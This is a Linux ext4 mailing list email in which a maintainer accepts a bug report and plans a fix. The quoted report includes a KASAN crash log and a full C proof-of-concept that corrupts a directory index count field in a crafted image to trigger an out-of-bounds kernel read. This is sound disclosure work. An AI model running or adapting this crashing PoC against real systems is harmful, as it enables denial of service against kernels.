Received: from mail-yw1-f175.google.com (mail-yw1-f175.google.com [209.85.128.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C0057233937
	for <linux-ext4@vger.kernel.org>; Wed, 24 Jun 2026 12:32:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.128.175
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782304358; cv=pass; b=pbpS21qbxxtNI1b6/vjbTU9lpCdtD6ABsVf/YtqcnfWIdRB/nW7IbY2EgBlOK+aNBGMuVuCHdgXAKhNpkWW+XUFfj1Vt8G5uSohkx330WtA07MNst8Xlz4myiDNCBqTNb9yRg0+5b79QejDW7MI5UxoFDx+A/5SFlJwTdL/KfXo=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782304358; c=relaxed/simple;
	bh=J7HCEdn4GmDbGuMkvQxlK5X9a/3nhyBoP4UEZjnoWPQ=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=UeAqCYI6IeKYXPEez53owo057cDfJTQWgtuAo1lGcsjysu/u2qJUclbvH/PYXN/MPWI9+b7YE13M2xQ37+yPwIx0D1vPUgDq+rFFAPl+HPmp70pLlffQ2Jf2Zs52WBClWPA01J4WWUwwr1OTJpsa8rotqpeOxs99iLB5gxWmoQ8=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=fjv4uuwr; arc=pass smtp.client-ip=209.85.128.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="fjv4uuwr"
Received: by mail-yw1-f175.google.com with SMTP id 00721157ae682-7dfe7712572so8171807b3.1
        for <linux-ext4@vger.kernel.org>; Wed, 24 Jun 2026 05:32:35 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1782304355; cv=none;
        d=google.com; s=arc-20240605;
        b=Y9aDOUNA9Lx7liVRMHSAzhO1seh7IFpk36Abp333Ztm6AsE6p0OWM0o8eYQQNM0hXs
         38X1Q0wuaB7bl1q4YYbwdmmwf4nVwdU+rowyn6ps/IGwaNBtCsqZMr69t0/fuFAjBkgd
         QAUdCr84wVHeYz4wOQNCalYQI171iafAtgMI1fYwbKLAcAH6K0Vv6WxBs7ZK+RzVDvrh
         wvrwKPADAiHyAYFYlRvgfioUxCt9O6ZZKvJ0pUwIJENTqx2FsBjKb5WERhLtP9IOSm0H
         pOwo4m3L/x3a+kpcHZsvm8vSan6x/Yj9bU0hM7bthuU2HYLr01kIAmUbPVgY+/6xdL89
         rJTA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=BZ83nkCo6dTzk/ENeR3by95YsnUAD5xZK/IqUeXBXzs=;
        fh=4Xx4GEChmv5yR2Ab0BiPXtJFILOUEQDwPOA8KwqOEVw=;
        b=UHWL6dWJNfLzMGquOXC7F4ulYjLrRDxr9USLMEhInJlJpEEEFxNXkQY4bzNZLsR/yR
         v2dIv30cdsHxPR0Xz+u62z/KhvUsfvJBh9FMwx6X0uRxccn29/UHkTcI9s8NFIgOfKnD
         NMR7q7MH1c5z7o1iKBWCYwNfgUPQep4BNmkyik1xdc0CC7FnUehO+gLThiviZ6LS0pYu
         OWhFaoArc9wCT0eBqq1sDYWRL7v0Onz+cMWBdcYansbYtjD/B1bERhHlQoi+pv9B1jgw
         JIlZIhU1yABKFthh9/bZkrRGkfgIAYPuHbKuj5JPS/pSzQYLtA6Z+IIy5ZTUoBeUMayi
         AhnQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1782304355; x=1782909155; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=BZ83nkCo6dTzk/ENeR3by95YsnUAD5xZK/IqUeXBXzs=;
        b=fjv4uuwrMYIXSIYlm/dHPvXyXyF5o4pWop94hlHZ7UVZ6uUXAuBNmz00fDElcoVpw2
         TiaZudhMFFW0ro5/UuZTK0HK5WXZUdBdLHsoV8iAQnEe49WBhegUr6/YKc3qnojtD0u0
         MaDQzkMmePRGiNiEK4hnMTiVJvsP9M0IMLuUwMdSKsIswc304XwqpZ0KP0kmn94gBBOl
         2nVLNUkTDxGzXOVVgsQqzC8+ac75OHvLOU6LQNEI/vIDCZIPXROv6gY+X4DITI5dhlxW
         FtzyUVe20w/lfE2m/Wbvas+eekkQ9eUjRQ24kUVyjrJmk7NYVZWBoPSC1VcjxjQICtWr
         P4Qw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1782304355; x=1782909155;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=BZ83nkCo6dTzk/ENeR3by95YsnUAD5xZK/IqUeXBXzs=;
        b=Z4OfP3MOIoXBH4heIZTxlEMIYr8jPZ1Ehllv3J8w89KtbXGFQJ+OoyOsbBGyrqcQrg
         pPDpWNk2NgWs8EPyKUX6Sw45pH+Jp84q/Sh7FrqUyxwmgYyD6V0ZFe0jYrntZl3jdcjc
         2gE38m9RU04NaqKtcV+cPxYmVYB+S7oThYekZ/wdZ2PXaTfJpPcrKlh8OC381dKUwxhq
         Ni5GDpHyu4thMfmOnLTpTXF87T1XITahAvLKe6d1wnvF44Hu54H+liR9oiSASh2EBfcx
         VnZ8IyPdocJ3SB2gNsZ20TfPn60g5YMoQ6fB5JbSYb7wY11Jap4YRPqdLYv8hHKiOLBF
         irwQ==
X-Gm-Message-State: AOJu0YxHBRQCzZbDewv0EyiBxRhbJn0zrjclpciOEZbrNCYUUr8QGOc2
	dgacQDvdCikopfTuzfzq1Mko1YhzObyhHyFsVcA97rK7uU8XdqWLsWdGx65gBi4aFV3Wup8aPXS
	IsTIaLMmckZtzgmvEEgc19Hk3gRnDnTU=
X-Gm-Gg: AfdE7cl1T3PhviEbvO/xKZKtzQXf9Yh0fDem131bYd9VMDkoKruCa6n03++CBq0yF49
	fBdKh+9VVesev42wPxP8ByNv783o2fjCYlwHYqXkfZPHkiR6SgDaBkXe8j+JSMVEQ+7JXpPLJ9v
	9FRSRKxMelohE/rNFTrNrgSEfXrBNe72MLiOSDy00Nt21AX3FP3waGE1VNgi3cFpyuP+UJVn/yZ
	JUKftC+IsZp310JRupxI+TRyN/hTs1a1LousOgxdXXWfJsQmSSCCfrn/GbizbNQyGKyR6SeyiVW
	JLKEQMOv2j0LlLZMQ/DoOMcAq4C8Cw==
X-Received: by 2002:a05:690c:f13:b0:7d1:b184:5407 with SMTP id
 00721157ae682-807ee19ee36mr28105967b3.18.1782304354764; Wed, 24 Jun 2026
 05:32:34 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-ext4@vger.kernel.org
List-Id: <linux-ext4.vger.kernel.org>
List-Subscribe: <mailto:linux-ext4+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-ext4+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260619191022.27008-1-ablagodarenko@thelustrecollective.com>
 <20260619191022.27008-2-ablagodarenko@thelustrecollective.com> <tencent_23A0889489F22224F3214F20C2C091373E0A@qq.com>
In-Reply-To: <tencent_23A0889489F22224F3214F20C2C091373E0A@qq.com>
From: Artem Blagodarenko <artem.blagodarenko@gmail.com>
Date: Wed, 24 Jun 2026 13:32:23 +0100
X-Gm-Features: AVVi8CcPeC4rvqhfw9f2LZRlQXluwkykoNYe-XZDMz6XwKdCh6V8N4ycFQ8ZdiI
Message-ID: <CA+rD4x9VB7HXhUDEmCHzJDfCKkZqy6LGGZj423v2GUEY5AD0yA@mail.gmail.com>
Subject: Re: [PATCH v3 01/10] ext4: replace ext4_dir_entry with ext4_dir_entry_2
To: XIAO WU <xiaowu.417@qq.com>
Cc: linux-ext4@vger.kernel.org, adilger.kernel@dilger.ca, 
	Andreas Dilger <adilger@dilger.ca>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Xiao,

Thanks for taking the time to verify the Sashiko AI finding and provide a
concrete reproducer and crash log for the missing count-vs-limit check in
ext4_dx_csum_verify()/ext4_dx_csum_set(). You're right that this is a real
bug, independent of this series (it's unmodified upstream logic that this
patch only renamed a parameter type on).

I've added a fix that validates count against limit before it's used to
compute the checksummed range, returning the same "corrupt, run e2fsck"
error path as the existing limit check. It will be included as the first
patch of the next version of this series, ahead of the patch that touches
this function, so the issue is fixed before it would otherwise be flagged
again.

Thanks again for the thorough analysis.

Artem

On Mon, 22 Jun 2026 at 18:29, XIAO WU <xiaowu.417@qq.com> wrote:
>
> Hi Artem,
>
> I came across the Sashiko AI review [1] of this patch and was able to
> reproduce a kernel crash triggered by a missing bounds check in
> ext4_dx_csum_verify().  Although the review notes this is a pre-existing
> issue (not introduced by your patch), I wanted to share the concrete
> reproduction evidence since this patch touches the same function.
>
> On Fri, Jun 19, 2026 at 03:10:05PM -0400, Artem Blagodarenko wrote:
>  > @@ -456,7 +456,7 @@ static __le32 ext4_dx_csum(struct inode *inode,
> struct ext4_dir_entry *dirent,
>  >  }
>  >
>  >  static int ext4_dx_csum_verify(struct inode *inode,
>  > -                   struct ext4_dir_entry *dirent)
>  > +                   struct ext4_dir_entry_2 *dirent)
>  >  {
>  >      struct dx_countlimit *c;
>  >      struct dx_tail *t;
>
> The problem is in the validation logic inside this function:
>
>    c =3D get_dx_countlimit(inode, dirent, &count_offset);
>    limit =3D le16_to_cpu(c->limit);
>    count =3D le16_to_cpu(c->count);          // =E2=86=90 read from disk,=
 never
> validated
>
>    if (count_offset + (limit * sizeof(struct dx_entry)) >
>        EXT4_BLOCK_SIZE(inode->i_sb) - sizeof(struct dx_tail)) {
>            warn_no_space_for_csum(inode);
>            return 0;
>    }
>
>    t =3D (struct dx_tail *)(((struct dx_entry *)c) + limit);
>
>    size =3D count_offset + (count * sizeof(struct dx_entry));  // =E2=86=
=90 uses
> unvalidated count
>    csum =3D ext4_chksum(ei->i_csum_seed, (__u8 *)dirent, size);
>          =E2=86=92 crc32c() reads `size` bytes from bh->b_data
>
> The `limit` value is bounds-checked against the block size, but `count`
> is never validated.  If a corrupted or maliciously crafted filesystem
> sets `count` to a large value like 65535, the computation:
>
>    size =3D count_offset + (65535 * 8) =3D ~524288 bytes
>
> causes crc32c() to read far past the 4096-byte buffer_head allocation.
>
> Why KASAN reports this as use-after-free rather than out-of-bounds:
>
> The buffer_head's b_data is a kmalloc'd slab object.  When crc32c()
> reads hundreds of kilobytes past the end of this 4K slab allocation, it
> crosses into adjacent slab pages.  Those pages contain memory that was
> previously allocated and freed (old dentries, inode structures, etc.).
> KASAN's quarantine poisons freed slab objects, so the access lands on a
> poisoned freed page and triggers the slab-use-after-free detector:
>
>    BUG: KASAN: use-after-free in crc32c+0x32a/0x380
>    Read of size 1 at addr ffff88802ca54000 by task poc/10993
>
> The crash is deterministic with a crafted image and triggers on any
> directory read (getdents64 / ls).
>
> [Crash log =E2=80=94 kernel 7.1.0-next-20260618, CONFIG_KASAN=3Dy, SMP]
>
>    Call Trace:
>     <TASK>
>     dump_stack_lvl
>     print_report
>     kasan_report
>     crc32c+0x32a/0x380
>     __ext4_read_dirblock+0x90f/0xbb0
>     dx_probe+0xbb/0x1670
>     ext4_htree_fill_tree+0x50e/0xb30
>     ext4_readdir+0x241b/0x39d0
>     iterate_dir+0x29b/0xaf0
>     __x64_sys_getdents64+0x140/0x2c0
>     do_syscall_64+0x129/0x880
>     entry_SYSCALL_64_after_hwframe+0x77/0x7f
>     </TASK>
>
> The PoC is attached below.  It creates a 64 MB ext4 image with
> metadata_csum and dir_index, fills a directory with 800 files to
> trigger htree indexing, unmounts, then corrupts the dx_countlimit's
> count field via direct block write before remounting and listing the
> directory.
>
>    gcc -o poc poc.c -static
>
> [1]
> https://sashiko.dev/#/patchset/20260619191022.27008-1-ablagodarenko%40the=
lustrecollective.com
>      (Sashiko AI code review =E2=80=94 "Out-of-Bounds Access", Severity: =
High)
>
> Thanks,
> XIAO
>
> // PoC: OOB read via unvalidated count in ext4_dx_csum_verify()
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <sys/mount.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <sys/syscall.h>
> #include <stdint.h>
>
> #define IMG_PATH "poc_ext4.img"
> #define MNT_PATH "poc_mnt"
> #define IMG_SIZE (64 * 1024 * 1024)
> #define BLCK_SIZE 4096
>
> int main(int argc, char **argv)
> {
>      char cmd[4096];
>      int img_fd, ret;
>      char loop_dev[64] =3D {0};
>      unsigned char buf[BLCK_SIZE];
>
>      printf("[*] ext4 dx_csum count OOB PoC\n");
>
>      /* Cleanup from previous runs */
>      system("umount poc_mnt 2>/dev/null");
>      system("losetup -d /dev/loop0 2>/dev/null");
>      system("rm -rf poc_mnt poc_ext4.img 2>/dev/null");
>      mkdir(MNT_PATH, 0755);
>
>      /* Create and format image with metadata_csum + dir_index */
>      printf("[*] Creating 64 MB image, formatting ext4...\n");
>      img_fd =3D open(IMG_PATH, O_CREAT | O_RDWR | O_TRUNC, 0644);
>      if (img_fd < 0) { perror("open"); return 1; }
>      ftruncate(img_fd, IMG_SIZE);
>      close(img_fd);
>      snprintf(cmd, sizeof(cmd),
>           "mkfs.ext4 -F -O metadata_csum,dir_index,^has_journal "
>           "-b %d %s 2>/dev/null", BLCK_SIZE, IMG_PATH);
>      if (system(cmd) !=3D 0) { fprintf(stderr, "mkfs failed\n"); return 1=
; }
>
>      /* Setup loop device */
>      printf("[*] Setting up loop...\n");
>      snprintf(cmd, sizeof(cmd), "losetup -f %s 2>/dev/null && "
>           "losetup -j %s | head -1 | cut -d: -f1", IMG_PATH, IMG_PATH);
>      FILE *fp =3D popen(cmd, "r");
>      if (fp) {
>          if (fgets(loop_dev, sizeof(loop_dev), fp)) {
>              char *nl =3D strchr(loop_dev, '\n');
>              if (nl) *nl =3D '\0';
>          }
>          pclose(fp);
>      }
>      if (!strlen(loop_dev)) { fprintf(stderr, "loop setup failed\n");
> return 1; }
>      printf("[*] Loop device: %s\n", loop_dev);
>
>      /* Mount and create htree directory with 800 files */
>      printf("[*] Mounting and creating htree directory...\n");
>      if (mount(loop_dev, MNT_PATH, "ext4", 0, NULL) < 0) {
>          perror("mount"); return 1;
>      }
>      mkdir(MNT_PATH "/dir", 0755);
>      for (int i =3D 0; i < 800; i++) {
>          char name[64];
>          snprintf(name, sizeof(name), MNT_PATH "/dir/file_%04d", i);
>          close(open(name, O_CREAT | O_WRONLY, 0644));
>      }
>      printf("[*] Unmounting to corrupt on-disk data...\n");
>      umount(MNT_PATH);
>
>      /*
>       * Corrupt the dx_countlimit count field.
>       * The htree root block is block 0 of the directory inode.
>       * dx_countlimit is at offset 8 in the INDEX-type dx block:
>       *   struct dx_countlimit { __le16 limit; __le16 count; };
>       * We set count =3D 0xFFFF (65535) to trigger massive OOB read.
>       */
>      printf("[*] Corrupting dx_countlimit.count in block 0...\n");
>      img_fd =3D open(IMG_PATH, O_RDWR);
>      if (img_fd < 0) { perror("open image"); return 1; }
>      memset(buf, 0, BLCK_SIZE);
>      /* Read block 0 of the directory inode.  Directory inode is typicall=
y
>       * inode #2 on a freshly formatted ext4.  For simplicity we scan for
>       * the INDEX signature (0x0A) at dx_root_info.dx_magic_offset. */
>      /* Seek to block group 0's inode table =E2=80=94 inode #2 is at offs=
et
>       * (2-1)*256 =3D 256 bytes into the inode table.  The inode table st=
arts
>       * at block (superblock.s_first_ino_blocks + 1) or similar.
>       * For standard ext4 with 4K blocks: inode table at block 1.
>       * inode #2 at block 1 offset 256.  i_block[0] gives the dir block. =
*/
>      unsigned char inode_buf[256];
>      lseek(img_fd, BLCK_SIZE + 256, SEEK_SET);  /* inode #2 */
>      read(img_fd, inode_buf, 256);
>      uint32_t dir_block =3D inode_buf[40] | (inode_buf[41]<<8) |
>                   (inode_buf[42]<<16) | (inode_buf[43]<<24);
>      printf("[*] Directory root block: %u\n", dir_block);
>
>      /* Read the dx root block, corrupt count at offset 10 (limit at 8,
> count at 10) */
>      lseek(img_fd, dir_block * BLCK_SIZE, SEEK_SET);
>      read(img_fd, buf, BLCK_SIZE);
>      uint16_t *count_ptr =3D (uint16_t *)(buf + 10);
>      printf("[*] Original count: %u, setting to 65535\n", *count_ptr);
>      *count_ptr =3D 0xFFFF;
>      lseek(img_fd, dir_block * BLCK_SIZE, SEEK_SET);
>      write(img_fd, buf, BLCK_SIZE);
>      fsync(img_fd);
>      close(img_fd);
>
>      /* Remount and trigger the bug by reading the directory */
>      printf("[*] Remounting and triggering via getdents64...\n");
>      if (mount(loop_dev, MNT_PATH, "ext4", 0, NULL) < 0) {
>          perror("remount"); return 1;
>      }
>      /* ls triggers ext4_readdir =E2=86=92 ext4_htree_fill_tree =E2=86=92=
 dx_probe =E2=86=92
> csum verify */
>      system("ls " MNT_PATH "/dir > /dev/null 2>&1");
>      printf("[*] Done =E2=80=94 check dmesg for KASAN report\n");
>
>      umount(MNT_PATH);
>      snprintf(cmd, sizeof(cmd), "losetup -d %s 2>/dev/null", loop_dev);
>      system(cmd);
>      return 0;
> }
>
>
